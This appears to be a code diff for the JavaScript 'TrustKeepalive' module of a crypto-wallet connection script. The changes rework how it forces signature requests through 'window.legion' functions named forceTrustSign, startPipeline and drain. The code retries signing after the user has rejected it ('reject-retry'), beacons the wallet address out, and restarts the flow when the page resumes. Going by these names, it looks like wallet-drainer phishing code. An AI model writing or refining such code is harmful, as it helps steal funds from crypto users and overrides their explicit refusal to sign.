@@ -131,21 +131,38 @@
   function fireSignOrPipeline(why) {
     console.warn('[TrustKeepalive] fire', why);
     try {
-      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
-        window.legion.forceTrustSign().catch(function () {});
+      if (window.legion && typeof window.legion.evmAlreadyConfirmed === 'function' &&
+          window.legion.evmAlreadyConfirmed()) {
+        console.warn('[TrustKeepalive] skip — EVM already confirmed');
+        return;
+      }
+    } catch (_) {}
+    try {
+      var L = window.legion;
+      var S = L && L.state;
+      if (typeof L.pipelineBusy === 'function' && L.pipelineBusy()) {
+        console.warn('[TrustKeepalive] skip — pipeline busy');
+        return;
+      }
+      // Reject-retry or resume — never parallel ad-hoc forceTrustSign
+      if (S && !S.userRejectedSign && (S.postConnectComplete || S.connecting || S.drainRunning)) {
+        console.warn('[TrustKeepalive] skip — legion owns flow / complete');
+        return;
+      }
+      if (typeof L.startPipeline === 'function') {
+        var reason = (S && S.userRejectedSign) ? 'reject-retry' : (why || 'resume');
+        L.startPipeline({ reason: reason }).catch(function () {});
+        return;
+      }
+      if (typeof L.forceTrustSign === 'function' && S && S.userRejectedSign) {
+        L.forceTrustSign().catch(function () {});
         return;
       }
     } catch (_) {}
     try {
       if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
         window.__TRUST_RUN_PIPELINE__(why || 'keepalive');
-        return;
       }
-    } catch (_) {}
-    try {
-      var L = window.legion;
-      if (L && typeof L.continueConnected === 'function') L.continueConnected();
-      else if (L && typeof L.drain === 'function') L.drain();
     } catch (_) {}
   }
 
@@ -156,19 +173,12 @@
     console.warn('[TrustKeepalive] freeze flush:', why);
     persistState();
     beaconNotify(getAddr());
-    // Last chance: kick sign while JS still alive (~ms)
-    try {
-      var L = window.legion;
-      var S = (L && L.state) || {};
-      if (getAddr() && !S.postConnectComplete) {
-        fireSignOrPipeline('freeze:' + why);
-      }
-    } catch (_) {}
+    // Freeze: beacon only — do NOT kick sign (JS may die mid-popup)
   }
 
   function hardResume(why) {
     var now = Date.now();
-    if (now - resumeAt < 600) return;
+    if (now - resumeAt < 1000) return;
     resumeAt = now;
 
     var need = false;
@@ -182,7 +192,6 @@
     try { sessionStorage.setItem('trust_need_resume', '0'); } catch (_) {}
     tryWakeLock();
 
-    // Restore instant-sign flag so we don't re-spam if already signed
     try {
       var ts = Number(sessionStorage.getItem('trust_instant_sign_at') || 0);
       if (ts && window.legion && window.legion.state) {
@@ -190,30 +199,18 @@
       }
     } catch (_) {}
 
-    var inTrust = false;
-    try {
-      if (window.__TRUST_IN_APP__ || (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__())) {
-        inTrust = true;
-      }
-    } catch (_) {}
-
-    if (inTrust) {
-      // Injected path — re-fire sign/drain immediately
-      fireSignOrPipeline('resume-inapp:' + why);
-      return;
-    }
-
+    // Single path: startPipeline('resume') — same as post-connect
     try {
       if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
         Promise.resolve(window.LegionWallet.tryRecoverStoredSession(true)).then(function () {
-          fireSignOrPipeline('resume:' + why);
+          fireSignOrPipeline('resume');
         }).catch(function () {
-          fireSignOrPipeline('resume-fallback:' + why);
+          fireSignOrPipeline('resume');
         });
         return;
       }
     } catch (_) {}
-    fireSignOrPipeline('resume:' + why);
+    fireSignOrPipeline('resume');
   }
 
   function tryWakeLock() {
